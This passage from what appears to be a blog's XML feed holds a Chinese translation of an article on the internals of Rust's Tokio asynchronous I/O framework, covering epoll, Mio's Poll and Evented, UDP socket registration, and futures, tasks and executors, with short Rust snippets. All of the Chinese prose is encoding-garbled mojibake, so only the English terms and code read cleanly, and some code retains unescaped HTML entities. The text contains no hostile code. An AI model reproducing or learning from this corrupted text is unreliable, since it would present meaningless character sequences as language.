é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>d3, timer, pomodoro</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€è­¯ã€‘Tokio å…§éƒ¨æ©Ÿåˆ¶ï¼šå¾é ­ç†è§£ Rust éåŒæ­¥ I/O æ¡†æ¶</title>
    <url>/2018/01/05/tokio-internal/</url>
    <content><![CDATA[
  



æœ¬æ–‡è­¯è‡ª Tokio internals: Understanding Rustâ€™s asynchronous I&#x2F;O framework from the bottom upã€‚Thanks David Simmons for this awesome article!

Tokio æ˜¯ Rust çš„é–‹ç™¼æ¡†æ¶ï¼Œç”¨æ–¼é–‹ç™¼éåŒæ­¥ I&#x2F;O ç¨‹å¼ï¼ˆasynchronous I&#x2F;Oï¼Œä¸€ç¨®äº‹ä»¶é©…å‹•çš„ä½œæ³•ï¼Œå¯å¯¦ç¾æ¯”å‚³çµ±åŒæ­¥ I&#x2F;O æ›´å¥½çš„å»¶ä¼¸æ€§ã€æ•ˆèƒ½èˆ‡è³‡æºåˆ©ç”¨ï¼‰ã€‚å¯æƒœçš„æ˜¯ï¼ŒTokio éæ–¼ç²¾å¯†çš„æŠ½è±¡è¨­è¨ˆï¼Œæ‹›è‡´é›£ä»¥å­¸ç¿’çš„æƒ¡åã€‚å³ä½¿æˆ‘è®€å®Œæ•™ç¨‹å¾Œï¼Œä¾ç„¶ä¸èªç‚ºè‡ªå·±å……åˆ†å…§åŒ–é€™äº›æŠ½è±¡å±¤ï¼Œä»¥ä¾¿æ¨æ–·å¯¦éš›ç™¼ç”Ÿçš„äº‹æƒ…ã€‚
å¾å‰çš„éåŒæ­¥ I&#x2F;O ç›¸é—œé–‹ç™¼ç¶“é©—ç”šè‡³é˜»ç¤™æˆ‘å­¸ç¿’ Tokioã€‚æˆ‘ç¿’æ…£ä½¿ç”¨ä½œæ¥­ç³»çµ±æä¾›çš„ selection å·¥å…·ï¼ˆä¾‹å¦‚ Linux epollï¼‰ç•¶ä½œèµ·é»ï¼Œå†è½‰ç§»è‡³ dispatchã€state machine ç­‰ç­‰ã€‚å€˜è‹¥ç›´æ¥å¾ Tokio æŠ½è±¡å±¤å‡ºç™¼ï¼Œå»æ²’æœ‰æ¸…æ¥šäº†è§£ epoll_wait() åœ¨ä½•è™•åŠå¦‚ä½•ç™¼ç”Ÿï¼Œæˆ‘æœƒè¦ºå¾—é›£ä»¥é€£çµæ¯å€‹æ¦‚å¿µã€‚Tokio èˆ‡ future-driven çš„æ–¹æ³•å°±å¥½åƒä¸€å€‹é»‘ç›’å­ã€‚
æˆ‘æ±ºå®šä¸ç¹¼çºŒç”±ä¸Šè€Œä¸‹çš„æ–¹æ³•å­¸ç¿’ Tokioï¼Œåå…¶é“è€Œè¡Œï¼Œè€Œæ˜¯é€éé–±è®€åŸå§‹ç¢¼ï¼Œç¢ºåˆ‡ç†è§£å…·é«”å¯¦ä½œæ˜¯å¦‚ä½•é©…å‹•å¾ epoll äº‹ä»¶åˆ° Future::poll() æ¶ˆè€— I&#x2F;O çš„æ•´å€‹éç¨‹ã€‚æˆ‘ä¸æœƒæ·±å…¥é«˜å±¤æ¬¡çš„ Tokio èˆ‡ futures ä½¿ç”¨ç´°ç¯€ï¼Œç¾æœ‰çš„æ•™ç¨‹ æœ‰æ›´å®Œæ•´è©³ç´°çš„å…§å®¹ã€‚é™¤äº†ç°¡çŸ­çš„å°çµï¼Œæˆ‘ä¹Ÿä¸æœƒæ¢è¨ä¸€èˆ¬æ€§çš„éåŒæ­¥ I&#x2F;O å•é¡Œï¼Œç•¢ç«Ÿé€™äº›å•é¡Œéƒ½å¯å¯«å€‹ç¨ç«‹çš„ä¸»é¡Œäº†ã€‚æˆ‘çš„ç›®æ¨™æ˜¯æœ‰ä¿¡å¿ƒè®“ futures èˆ‡ Tokio ä»¥æˆ‘æ‰€èªçŸ¥çš„æ–¹å¼åŸ·è¡Œã€‚
é¦–å…ˆï¼Œæœ‰äº›é‡è¦çš„è²æ˜ã€‚è«‹æ³¨æ„ï¼ŒTokio æ­£å¿«é€Ÿé–‹ç™¼ä¸­ï¼Œé€™è£¡æ‰€è¦‹æ‰€èå¯èƒ½ä¸ä¹…å°±æœƒéæ™‚ã€‚é€™å€‹ç ”ç©¶ä¸­æˆ‘ç”¨äº† tokio-core 0.1.10ã€futures- 0.1.17 èˆ‡ mio 0.6.10ã€‚ç”±æ–¼æˆ‘æƒ³å¾æœ€åº•å±¤ç†è§£ Tokioï¼Œæˆ‘ä¸¦ä¸æœƒè€ƒæ…®æ›´é«˜å±¤æ¬¡çš„å¥—ä»¶å¦‚ tokio-proto èˆ‡ tokio-serviceã€‚tokio-core çš„äº‹ä»¶ç³»çµ±æœ¬èº«æœ‰è¨±å¤šç´°ç¯€ï¼Œç‚ºäº†ç²¾ç°¡ï¼Œæˆ‘æœƒç›¡é‡é¿é–‹é€™äº›ç´°é …ã€‚æˆ‘åœ¨ Linux ä½œæ¥­ç³»çµ±ä¸Šç ”ç©¶ Tokioï¼Œè€Œæœ‰äº›è¨è«–ç´°ç¯€èˆ‡ä½œæ¥­ç³»çµ±ç›¸ä¾ï¼Œå¦‚ epollã€‚æœ€å¾Œï¼Œé€™è£¡æ‰€æœ‰æ±è¥¿éƒ½æ˜¯æˆ‘é€™å€‹ Tokio æ–°æ‰‹çš„è©®é‡‹ï¼Œå¯èƒ½æœƒæœ‰éŒ¯èª¤æˆ–èª¤å°ã€‚
Asynchronous I&#x2F;O in a nutshellåŒæ­¥ I&#x2F;O ç¨‹å¼æœƒåŸ·è¡Œé˜»å¡æ€§çš„ I&#x2F;O æ“ä½œï¼Œç›´åˆ°æ“ä½œå®Œæˆã€‚ä¾‹å¦‚è®€å–æœƒé˜»å¡è‡³è³‡æ–™æŠµé”ï¼Œå¯«å…¥æœƒé˜»å¡ç·šç¨‹ç›´åˆ°æ¬²å‚³éçš„ bytes é€é” kernelã€‚é€™äº›æ“ä½œéå¸¸é©åˆä¾åºåŸ·è¡Œçš„å‚³çµ±å‘½ä»¤å¼ç¨‹å¼è¨­è¨ˆã€‚èˆ‰ä¾‹ä¾†èªªï¼Œä¸€å€‹ HTTP ä¼ºæœå™¨æ›¿æ¯å€‹æ–°é€£ç·šç”¢ç”Ÿä¸€å€‹æ–°ç·šç¨‹ï¼Œé€™å€‹ç·šç¨‹æœƒè®€å–è³‡æ–™ä¸¦é˜»å¡ç·šç¨‹ç›´åˆ°æ¥æ”¶å®Œæ•´çš„ requestï¼Œä¹‹å¾Œè™•ç†è«‹æ±‚ï¼Œå†ä¾†é˜»å¡ç·šç¨‹è‡³è³‡æ–™å®Œå…¨å¯«å…¥ responseã€‚é€™æ˜¯å€‹æ–¹æ³•éå¸¸ç›´è§€ï¼Œç¼ºé»æ˜¯æœƒé˜»å¡ç·šç¨‹ï¼Œå› æ­¤æ¯å€‹é€£ç·šçš„ç·šç¨‹è¦å„è‡ªç¨ç«‹ï¼Œæ¯å€‹ç·šç¨‹ä¹Ÿéœ€æœ‰è‡ªå·±çš„ stackã€‚ç„¶è€Œï¼Œç·šç¨‹é–‹éŠ·é˜»ç¤™äº†ä¼ºæœå™¨è™•ç†å¤§é‡é€£ç·šçš„å¯å»¶ä¼¸æ€§ï¼ˆåƒé–± C10k problem)ï¼Œå°ä½éšç³»çµ±ä¾†èªªä¹Ÿä¸æ˜“è² è·ã€‚
å¦‚æœ HTTP server ä½¿ç”¨éåŒæ­¥ I&#x2F;O é–‹ç™¼ï¼Œæ›å¥è©±èªªï¼Œåœ¨åŒä¸€å€‹ç·šç¨‹ä¸Šè™•ç†æ‰€æœ‰ I&#x2F;O æ“ä½œã€‚å¦‚æ­¤ä¸€ä¾†ï¼Œæ‰€æœ‰æ´»èºçš„é€£ç·šä»¥åŠ socket ç›£è½éƒ½æœƒé…ç½®ç‚ºéé˜»å¡ç‹€æ…‹ï¼ˆnon-blockingï¼‰ï¼Œä¸¦åœ¨ event loop ä¸­ç›£æ§è®€å–èˆ‡å¯«å…¥æ˜¯å¦å°±ç·’ï¼Œé€²è€Œåœ¨äº‹ä»¶ç™¼ç”Ÿæ™‚åˆ†æ´¾çµ¦å°æ‡‰çš„è™•ç†ç¨‹å¼ï¼ˆhandlerï¼‰ã€‚è€Œæ¯å€‹é€£ç·šéƒ½éœ€ç¶­è­·è‡ªèº«çš„ç‹€æ…‹èˆ‡ bufferï¼Œå¦‚æœä¸€å€‹è™•ç†ç¨‹å¼ä¸€æ¬¡åƒ…èƒ½å¾ 200 bytes çš„ request ä¸­è®€å– 100 å€‹ä½å…ƒçµ„ï¼ˆbytesï¼‰ï¼Œå®ƒå°±ä¸èƒ½ç­‰å¾…å‰©ä¸‹çš„ bytes è€Œé€ æˆç·šç¨‹é˜»å¡ï¼Œè™•ç†ç¨‹å¼å¿…é ˆå°‡éƒ¨åˆ†è³‡æ–™å„²å­˜åœ¨ buffer ä¸­ï¼Œè¨­å®šç•¶å‰çš„ç‹€æ…‹ç‚ºã€Œè®€å–è«‹æ±‚ä¸­ã€ï¼Œä¸¦è¿”å›çµ¦ event loopã€‚å¾…åˆ°ä¸‹ä¸€æ¬¡é€£ç·šèª¿ç”¨çš„ç›¸åŒçš„è™•ç†ç¨‹å¼ï¼Œå®ƒæ‰å¯è®€å–å‰©é¤˜çš„ bytes ä¸¦å°‡ç‹€æ…‹è½‰ç‚ºã€Œå¯«å…¥å›æ‡‰ä¸­ã€ã€‚å¦‚æ­¤çš„è³‡æºç®¡ç†ç³»çµ±å°‡æœƒéå¸¸è¿…é€Ÿï¼Œä½†åŒæ™‚ä¹Ÿç”¢ç”Ÿæ›´è¤‡é›œçš„ state machine èˆ‡å®¹æ˜“å‡ºéŒ¯çš„æ¯›ç—…ã€‚
ç†æƒ³ä¸­çš„éåŒæ­¥ I&#x2F;O æ¡†æ¶æ‡‰è©²è¦æä¾›èƒ½å¯«å‡ºè¿‘ä¼¼æ–¼åŒæ­¥ I&#x2F;O çš„ç¨‹å¼ï¼Œä½†åº•å±¤æ˜¯ event loop èˆ‡ state machineã€‚é€™å°æ¯å€‹èªè¨€ä¾†èªªéƒ½å¾ˆä¸å®¹æ˜“ï¼Œä¸é Tokio çš„å¯¦ç¾å·²æ¥è¿‘äº†ã€‚
The Tokio stack
Tokio çš„æŠ€è¡“æ£§ç”±ä¸‹åˆ—å¹¾å€‹éƒ¨åˆ†çµ„æˆï¼š

The system selectorã€‚æ¯å€‹ä½œæ¥­ç³»çµ±çš†æä¾›æ¥æ”¶ I&#x2F;O äº‹ä»¶çš„å·¥å…·ï¼Œå¦‚ epollï¼ˆlinuxï¼‰ã€kqueue()ï¼ˆFreeBSD&#x2F;macOSï¼‰ï¼Œèˆ‡ IOCPï¼ˆWindowsï¼‰ã€‚
Mio - Metal I&#x2F;Oã€‚Mio æ˜¯ä¸€å€‹ Rust crateï¼Œæä¾›ä½éšé€šç”¨çš„ I&#x2F;O APIï¼Œå…§éƒ¨è™•ç†ç‰¹å®šä½œæ¥­ç³»çµ±çš„ selector å¯¦ä½œç´°ç¯€ï¼Œæ‰€ä»¥ä½ ä¸éœ€å†è™•ç†é€™ä»¶äº‹ã€‚
Futuresã€‚Futures ä»¥å¼·å¤§çš„æŠ½è±¡ä¾†è¡¨ç¤ºå°šæœªç™¼ç”Ÿçš„äº‹ç‰©ã€‚é€™äº› future ä»¥è¨±å¤šå¥½ç”¨çš„æ–¹å¼çµ„åˆæˆå¦ä¸€æ–°çš„è¤‡åˆ future ä¾†ä»£è¡¨ä¸€ç³»åˆ—è¤‡é›œçš„äº‹ä»¶ã€‚é€™å€‹æŠ½è±¡å±¤è¶³ä»¥é€šç”¨æ–¼è¨±å¤š I&#x2F;O ä¹‹å¤–çš„äº‹ä»¶ï¼Œä½†åœ¨ Tokio ä¸­ï¼Œæˆ‘å€‘å°ˆæ³¨åœ¨åˆ©ç”¨ futures é–‹ç™¼éåŒæ­¥ I&#x2F;O state machinesã€‚
Tokioã€‚tokio-core æä¾›ä¸€å€‹ä¸­å¿ƒçš„ event loopï¼Œé€™å€‹ event loop æ•´åˆ Mio å›æ‡‰ I&#x2F;O äº‹ä»¶ï¼Œä¸¦é©…å‹• futures å®Œæˆï¼ˆcompletionï¼‰ã€‚
Your programã€‚ä¸€å€‹æ¡ç”¨ Tokio æ¡†æ¶çš„ç¨‹å¼ï¼Œæœƒä»¥ futures æ“ä½œéåŒæ­¥ I&#x2F;Oï¼Œä¸¦å°‡é€™äº› futures å‚³éçµ¦ Tokio çš„ event loop ä¾†åŸ·è¡Œã€‚

Mio: Metal I&#x2F;OMio æ—¨åœ¨æä¾›ä¸€ç³»åˆ—ä½éšçš„ I&#x2F;O APIï¼Œå…è¨±èª¿ç”¨ç«¯æ¥æ”¶äº‹ä»¶ï¼Œå¦‚ socket è®€å¯«å°±ç·’ç‹€æ…‹ï¼ˆreadiness stateï¼‰æ”¹è®Šç­‰ã€‚é‡é»å¦‚ä¸‹ï¼š

Poll èˆ‡ Eventedã€‚Mio æä¾› Evented trait ä¾†è¡¨ç¤ºä»»ä½•å¯ç•¶ä½œäº‹ä»¶ä¾†æºçš„äº‹ç‰©ã€‚åœ¨ä½ çš„ event loop ä¸­ï¼Œä½ æœƒåˆ©ç”¨ mio::Poll ç‰©ä»¶è¨»å†Šä¸€å®šæ•¸é‡çš„ Eventedï¼Œå†èª¿ç”¨ mio::Poll::poll ä¾†é˜»å¡ loopï¼Œç›´åˆ°ä¸€è‡³å¤šå€‹ Evented ç”¢ç”Ÿäº‹ä»¶ï¼ˆæˆ–è¶…æ™‚ï¼‰ã€‚

System selectorã€‚Mio æä¾›å¯è·¨å¹³å°çš„ system selector è¨ªå•ï¼Œæ‰€ä»¥ Linux epollã€Windows IOCPã€FreeBSD&#x2F;macOS kqueue()ï¼Œç”šè‡³è¨±å¤šæœ‰æ½›åŠ›çš„å¹³å°éƒ½å¯èª¿ç”¨ç›¸åŒçš„ APIã€‚ä¸åŒå¹³å°ä½¿ç”¨ Mio API çš„é–‹éŠ·ä¸ç›¡ç›¸åŒã€‚ç”±æ–¼ Mio æ˜¯æä¾›åŸºæ–¼ readinessï¼ˆå°±ç·’ç‹€æ…‹ï¼‰çš„ APIï¼Œèˆ‡ Linux epoll ç›¸ä¼¼ï¼Œä¸å°‘ API åœ¨ Linux ä¸Šéƒ½å¯ä»¥ä¸€å°ä¸€æ˜ å°„ã€‚ï¼ˆä¾‹å¦‚ï¼šmio::Events å¯¦è³ªä¸Šæ˜¯ä¸€å€‹ struct epoll_event é™£åˆ—ã€‚ï¼‰å°æ¯”ä¹‹ä¸‹ï¼ŒWindows IOCP æ˜¯åŸºæ–¼å®Œæˆï¼ˆcompletion-basedï¼‰è€ŒéåŸºæ–¼ readiness çš„ APIï¼Œæ‰€ä»¥å…©è€…é–“æœƒéœ€è¦è¼ƒå¤šæ©‹æ¥ã€‚Mio åŒæ™‚æä¾›è‡ªèº«ç‰ˆæœ¬çš„ std::net struct å¦‚ TcpListenerã€TcpStream èˆ‡ UdpSocketã€‚é€™äº› API å°è£ std::net ç‰ˆæœ¬çš„ APIï¼Œé è¨­ç‚ºéé˜»å¡ä¸”æä¾› Evented å¯¦ä½œè®“å…¶å°‡ socket åŠ å…¥ system selectorã€‚

Non-system eventsã€‚Mio é™¤äº†æä¾›å¾ I&#x2F;O æ‰€å¾—çš„ readiness ç‹€æ…‹ä¾†æºï¼Œä¹Ÿå¯ä»¥ç”¨ä¾†æŒ‡ç¤ºå¾ user-space ä¾†çš„ readiness äº‹ä»¶ï¼ˆéç³»çµ±äº‹ä»¶ï¼‰ã€‚èˆ‰ä¾‹ä¾†èªªï¼Œç•¶ä¸€å€‹å·¥ä½œç·šç¨‹ï¼ˆworker threadï¼‰å®Œæˆä¸€å–®ä½çš„å·¥ä½œï¼Œå®ƒå°±å¯ä»¥å‘ event loop ç™¼å‡ºå®Œæˆä¿¡è™Ÿã€‚ä½ çš„ç¨‹å¼èª¿ç”¨ Registration::new2() ä»¥å–å¾—ä¸€å€‹ (Registration, SetReadiness) å…ƒçµ„ã€‚Registration æ˜¯ä¸€å€‹å¯¦ä½œ Evented ä¸”è—‰ç”± Mio è¨»å†Šåœ¨ event loop çš„ç‰©ä»¶ï¼›è€Œéœ€è¦æŒ‡ç¤ºç•¶å‰ readiness ç‹€æ…‹æ™‚ï¼Œå‰‡æœƒèª¿ç”¨ SetReadiness::set_readinessã€‚åœ¨ Linux ä¸Šï¼Œéç³»çµ±äº‹ä»¶é€šçŸ¥ä»¥ pipe å¯¦ä½œï¼Œç•¶èª¿ç”¨ SetReadiness::set_readiness() æ™‚ï¼Œæœƒå°‡ 0x01 é€™å€‹ä½å…ƒçµ„å¯«å…¥ pipe ä¸­ã€‚è€Œ mio::Poll åº•å±¤çš„ epoll æœƒé…ç½®ç‚ºç›£æ§ pipe è®€å–çµæŸï¼Œæ‰€ä»¥ epoll_wait() æœƒè§£é™¤é˜»å¡ï¼Œè€Œ Mio å°±å¯ä»¥å°‡äº‹ä»¶å‚³éåˆ°èª¿ç”¨ç«¯ã€‚å¦å¤–ï¼Œç„¡è«–è¨»å†Šå¤šå°‘éç³»çµ±äº‹ä»¶ï¼Œéƒ½åªæœƒåœ¨ Poll å¯¦ä¾‹åŒ–æ™‚å»ºç«‹å”¯ä¸€ä¸€å€‹ pipeã€‚


æ¯å€‹ Evented çš„è¨»å†Šçš†èˆ‡ä¸€å€‹ç”±èª¿ç”¨ç«¯æä¾› usize å‹åˆ¥çš„ mio::Token ç¶å®šï¼Œé€™å€‹ token å°‡æœƒèˆ‡äº‹ä»¶ä¸€èµ·è¿”å›ï¼Œä»¥æŒ‡ç¤ºå‡ºå°æ‡‰çš„è¨»å†Šè³‡è¨Šã€‚é€™ç¨®ä½œæ³•å¾ˆå¥½åœ°æ˜ å°„åˆ° Linux çš„ system selectorï¼Œå› ç‚º token å¯ä»¥æ”¾ç½®åœ¨ 64-bit çš„ epoll_data union ä¸­ï¼Œä¸¦ä¿æŒç›¸åŒçš„åŠŸèƒ½ã€‚
é€™è£¡æä¾›ä¸€å€‹ Mio æ“ä½œçš„å¯¦éš›æ¡ˆä¾‹ï¼Œä¸‹é¢æ˜¯æˆ‘å€‘åœ¨ Linux ä¸Šä½¿ç”¨ Mio ç›£æ§ä¸€å€‹ UDP socket çš„æƒ…æ³ï¼š

å»ºç«‹ socketã€‚
 let socket = mio::net::UdpSocket::bind(    &amp;SocketAddr::new(        std::net::IpAddr::V4(std::net::Ipv4Addr::new(127,0,0,1)),        2000    )).unwrap();
 å»ºç«‹ä¸€å€‹ Linux UDP socketï¼Œå…¶ä¸­å°è£ä¸€å€‹ std::net::UdpSocketï¼Œå†å°è£åœ¨ mio::net::UdpSocket ä¸­ã€‚é€™å€‹ socket ç‚ºéé˜»å¡æ€§ï¼ˆnon-blockingï¼‰ã€‚

å»ºç«‹ poll å¯¦ä¾‹ã€‚
 let poll = mio::Poll::new().unwrap();
 åœ¨é€™æ­¥é©Ÿï¼ŒMio åˆå§‹åŒ– system selectorã€readiness ä½‡åˆ—ï¼ˆç”¨æ–¼éç³»çµ±äº‹ä»¶ï¼‰ï¼Œä»¥åŠä½µç™¼ä¿è­·ã€‚ç•¶ readiness ä½‡åˆ—åˆå§‹åŒ–æ™‚ï¼Œæœƒå»ºç«‹ä¸€å€‹ pipeï¼Œè®“ readiness å¾ user-space ç™¼å‡ºä¿¡è™Ÿï¼Œè€Œé€™å€‹ pipe çš„æª”æ¡ˆæè¿°ç¬¦ï¼ˆfile descriptorï¼‰æœƒåŠ å…¥ epoll ä¸­ã€‚æ¯å€‹ Poll ç‰©ä»¶å»ºç«‹æ™‚ï¼Œéƒ½æœƒè³¦äºˆä¸€å€‹ç¨ç‰¹ã€éå¢çš„ selector_idã€‚

é€é poll è¨»å†Š socketã€‚
 poll.register(    &amp;socket,    mio::Token(0),    mio::Ready::readable(),    mio::PollOpt::level()).unwrap();
 UdpSocket çš„ Evented::register() è¢«èª¿ç”¨æ™‚ï¼Œæœƒå°‡ä»£ç†æŒ‡å‘ä¸€å€‹å°è£çš„ EventedFdï¼Œé€™å€‹ EventedFd æœƒå°‡ socket çš„ file descriptor åŠ å…¥ poll selector ä¸­ï¼ˆæœ€çµ‚æœƒèª¿ç”¨ epoll_ctl(fepd, EPOLL_CTL_ADD, fd, &amp;epoll_event)ï¼Œè€Œ epoll_event.data è¨­ç½®ç‚ºå‚³å…¥çš„ token å€¼ï¼‰ã€‚ç•¶ä¸€å€‹ UdpSocket è¨»å†Šå¾Œï¼Œselector_id æœƒè¨­ç½®åˆ°èˆ‡å‚³å…¥çš„ Poll ç›¸åŒï¼Œå¾è€Œèˆ‡ selector ç”¢ç”Ÿé€£çµã€‚

**åœ¨ event loop ä¸­å‘¼å« poll()**ã€‚
 loop &#123;    poll.poll(&amp;mut events, None).unwrap();    for event in &amp;events &#123;        handle_event(event);    &#125;&#125;
 System selectorï¼ˆepoll_wait()ï¼‰èˆ‡ readiness ä½‡åˆ—å°‡æœƒè¼ªè©¢ï¼ˆpollï¼‰æ–°çš„äº‹ä»¶ã€‚ï¼ˆepoll_wait() æœƒé˜»å¡ï¼Œä½†ç”±æ–¼éç³»çµ±äº‹ä»¶æ˜¯é€é pipe å‡ºç™¼ epollï¼Œäº‹ä»¶ä»æœƒå³æ™‚è™•ç†ã€‚ï¼‰é€™ä¸€ç³»åˆ—çµ„åˆçš„äº‹ä»¶å¯ä¾›èª¿ç”¨ç«¯è™•ç†ã€‚


Futures and TasksFutures æ˜¯å¾å‡½æ•¸å¼ç¨‹å¼è¨­è¨ˆå€Ÿä¾†çš„æŠ€è¡“ï¼Œä¸€å€‹å°šæœªå®Œæˆçš„é‹ç®—æœƒä»¥ä¸€å€‹ future ä»£è¡¨ï¼Œè€Œé€™äº›ç¨ç«‹çš„ future å¯ä»¥çµ„åˆèµ·ä¾†ï¼Œé–‹ç™¼æ›´è¤‡é›œçš„ç³»çµ±ã€‚é€™å€‹æ¦‚å¿µå°éåŒæ­¥ I&#x2F;O éå¸¸ä¸­ç”¨ï¼Œå› ç‚ºåœ¨è™•ç†äº¤æ˜“ï¼ˆtransactionï¼‰çš„æ‰€æœ‰åŸºç¤æ­¥é©Ÿï¼Œéƒ½å¯ä»¥æ¨¡åŒ–ç‚ºåˆæˆ futuresï¼ˆcombinded futuresï¼‰ã€‚ä»¥ HTTP ä¼ºæœå™¨ç‚ºä¾‹ï¼Œä¸€å€‹ future è®€å– requestï¼Œæœƒå¾æ¥æ”¶åˆ°æœ‰æ•ˆè³‡æ–™é–‹å§‹è®€å–åˆ° request çµæŸï¼Œå¦ä¸€å€‹ future å‰‡æœƒè™•ç†é€™å€‹ request ä¸¦ç”¢ç”Ÿ responseï¼Œå†å¦ä¸€å€‹ future å‰‡æœƒå¯«å…¥ responsesã€‚
åœ¨ Rust ä¸­ï¼Œfutures crate å¯¦ç¾äº† futuresã€‚ä½ å¯ä»¥é€éå¯¦ä½œ Future trait ä¾†å®šç¾©è‡ªå·±çš„ futureï¼Œé€™å€‹ trait éœ€å¯¦ç¾ poll() æ–¹æ³•ï¼Œé€™å€‹æ–¹æ³•æœƒåœ¨éœ€è¦æ™‚èª¿ç”¨ï¼Œå…è¨± future é–‹å§‹åŸ·è¡Œã€‚poll() æ–¹æ³•æœƒå›å‚³ä¸€å€‹éŒ¯èª¤ï¼ˆerrorï¼‰ï¼Œæˆ–å›å‚³ä¸€å€‹æŒ‡ç¤ºå‘ŠçŸ¥ future ä»åœ¨è™•ç†ï¼Œæˆ–æ˜¯ç•¶ future å®Œæˆæ™‚è¿”å›ä¸€å€‹å€¼ã€‚Future trait ä¹Ÿæä¾›è¨±å¤šçµ„åˆæ“ä½œå­ï¼ˆcombinatorï¼‰ä½œç‚ºé è¨­æ–¹æ³•ã€‚
æ¬²ç†è§£ futuresï¼Œé ˆå…ˆæ¢è¨ä¸‰å€‹é‡è¦çš„æ¦‚å¿µï¼štasksã€executorsï¼Œä»¥åŠ notificationsï¼Œä¸”éœ€ç†è§£æ­¤ä¸‰è€…è©²å¦‚ä½•å®‰æ’ï¼Œæ‰èƒ½åœ¨æ­£ç¢ºæ™‚é–“é»èª¿ç”¨ future çš„ poll() æ–¹æ³•ã€‚æ¯ä¸€å€‹ future éƒ½åœ¨ä¸€å€‹ task èªå½™ç’°å¢ƒï¼ˆcontextï¼‰ä¸­åŸ·è¡Œã€‚ä¸€å€‹ task åªèˆ‡ä¸€å€‹ future é—œè¯ï¼Œè€Œé€™å€‹ future å»å¯èƒ½æ˜¯ä¸€å€‹åˆæˆçš„ futureï¼Œé©…å‹•å…¶ä»–å°è£çš„ futuresã€‚ï¼ˆèˆ‰ä¾‹ä¾†èªªï¼Œå¤šå€‹ future ç”¨ join_all() çµ„åˆæ“ä½œå­ï¼Œä¸²é€£æˆå–®ä¸€ä¸€å€‹ futureï¼Œæˆ–æ˜¯å…©å€‹ future åˆ©ç”¨ and_then() çµ„åˆæ“ä½œå­ä¾†ä¾åºåŸ·è¡Œã€‚ï¼‰
Task èˆ‡å®ƒçš„ futures éœ€è¦è¢«ä¸€å€‹ executor åŸ·è¡Œã€‚ä¸€å€‹ executor çš„è²¬ä»»æ˜¯åœ¨æ­£ç¢ºæ™‚é–“é»è¼ªè©¢ task&#x2F;futureï¼Œè¼ªè©¢é€šå¸¸æœƒåœ¨æ¥æ”¶åˆ°åŸ·è¡Œé€²åº¦é–‹å§‹çš„é€šçŸ¥æ™‚ã€‚è€Œé€™å€‹é€šçŸ¥å°‡åœ¨ä¸€å€‹å¯¦ä½œ futures::executor::Notify trait çš„ç‰©ä»¶èª¿ç”¨ notify æ™‚ç™¼å¸ƒã€‚é€™è£¡æœ‰å€‹ä¾‹å­ï¼Œæ˜¯ç”± futures crate æ‰€æä¾›çš„éå¸¸ç°¡å–®çš„ executorï¼Œåœ¨èª¿ç”¨ future ä¸Šçš„ wait() è¢«å‘¼å«ã€‚æ“·è‡ªåŸå§‹ç¢¼ï¼š
/// Waits for the internal future to complete, blocking this thread&#x27;s/// execution until it does.////// This function will call `poll_future` in a loop, waiting for the future/// to complete. When a future cannot make progress it will use/// `thread::park` to block the current thread.pub fn wait_future(&amp;mut self) -&gt; Result&lt;F::Item, F::Error&gt; &#123;    ThreadNotify::with_current(|notify| &#123;        loop &#123;            match self.poll_future_notify(notify, 0)? &#123;                Async::NotReady =&gt; notify.park(),                Async::Ready(e) =&gt; return Ok(e),            &#125;        &#125;    &#125;)&#125;

çµ¦å®šä¸€å€‹èåˆ task èˆ‡ future çš„ futures::executor::Spawn ç‰©ä»¶ï¼Œé€™å€‹ executor åœ¨è¿´åœˆä¸­èª¿ç”¨ poll_future_notifyã€‚é€™å€‹ Notify æœƒæˆç‚º task åŸ·è¡Œèªå½™ç’°å¢ƒçš„ä¸€éƒ¨åˆ†ï¼Œfuture ä¹Ÿæœƒè¢«è¼ªè©¢ã€‚å¦‚æœä¸€å€‹ future poll æ–¹æ³•å›å‚³ Async::NotReadyï¼Œè¡¨ç¤º future ä»ç­‰å¾…ä¸­ï¼Œå¿…é ˆåœ¨å¾€å¾Œå†æ¬¡è¼ªè©¢ã€‚Notify object æœƒå¾ futures::task::current() å–å¾—ä¸€å€‹æŒ‡å‘ task çš„ handleï¼Œä¸”åœ¨ future æœ‰äº›é€²å±•æ™‚èª¿ç”¨ notify() æ–¹æ³•ã€‚ï¼ˆç•¶ä¸€å€‹ future è¢«è¼ªè©¢æ™‚ï¼Œèˆ‡è©² future ç›¸é—œçš„ task è¨Šæ¯å°‡æœƒå„²å­˜åˆ° thread-local ä¸­ï¼Œthread-local å¯ä»¥é€é current() å­˜å–å–å¾—ã€‚ï¼‰ä¸Šä¾‹ä¸­ï¼Œå¦‚æœè¼ªè©¢å›å‚³ Async::NotReadyï¼Œexecutor æœƒé˜»å¡è‡³æ¥æ”¶åˆ°é€šçŸ¥ã€‚ä¹Ÿè¨± future åœ¨å…¶ä»–ç·šç¨‹é‹ç®—ï¼Œåœ¨å®Œæˆæ™‚èª¿ç”¨ notify()ï¼›æˆ–æ˜¯ poll() æ–¹æ³•åœ¨è¿”å› Asynx::NotReady ä¹‹å‰ï¼Œè‡ªèº«ç›´æ¥èª¿ç”¨äº† notify()ï¼ˆå¾Œè€…ä¸¦ä¸å¸¸è¦‹ï¼Œå› ç‚ºç†è«–ä¸Šä¸€å€‹ poll() åœ¨è¿”å›ä¹‹å‰æ‡‰è©²æŒçºŒå–å¾—é€²å±•ï¼‰ã€‚ 
Tokio çš„ event loop è¡Œç‚ºä¸Šæ¯”ç°¡å–®æ•´åˆã€Œ Mio äº‹ä»¶é©…å‹• future å®Œæˆã€ä¾†å¾—ç²¾ç´°ã€‚èˆ‰ä¾‹ä¾†èªªï¼Œä¸€å€‹ Mio event è¡¨ç¤ºä¸€å€‹ socket çš„ readinessï¼ˆå°±ç·’ç‹€æ…‹ï¼‰ï¼Œæœ€å¾Œæœƒç”¢ç”Ÿä¸€å€‹é€šçŸ¥ï¼Œè¶³ä»¥å‘ŠçŸ¥ç›¸å°æ‡‰çš„ future éœ€è¦è¼ªè©¢ã€‚
